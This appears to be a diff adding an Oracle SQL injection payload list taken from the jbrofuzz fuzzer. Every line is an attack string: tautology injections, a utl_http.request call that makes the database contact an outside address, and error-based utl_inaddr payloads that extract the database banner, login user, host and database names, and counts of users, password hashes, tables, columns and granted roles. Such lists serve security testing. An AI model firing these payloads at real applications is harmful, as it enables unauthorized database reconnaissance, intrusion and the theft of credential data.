@@ -1,0 +1,15 @@
+# contains statements from jbrofuzz
+’ or ‘1’=’1
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+
